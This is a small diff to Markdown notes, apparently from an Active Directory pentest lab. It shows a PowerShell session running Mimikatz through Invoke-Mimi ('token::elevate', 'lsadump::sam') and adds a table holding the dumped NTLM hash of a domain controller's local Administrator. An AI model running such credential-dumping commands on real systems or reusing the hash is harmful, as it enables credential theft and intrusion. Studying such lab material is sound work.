@@ -473,4 +473,11 @@ Enter-PSSession -Session $sess
 Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
 ```
 ![[Pasted image 20231025114637.png]]
-'Local built-in Admi'
+`Local built-in Administrator -dcorp-dc`
+
+|Type|Hash|
+|---|---|
+|Password|null|
+|NTLM|a102ad5753f4c441e3af31c97fad86fd|
+|aes256_hmac|null|
+
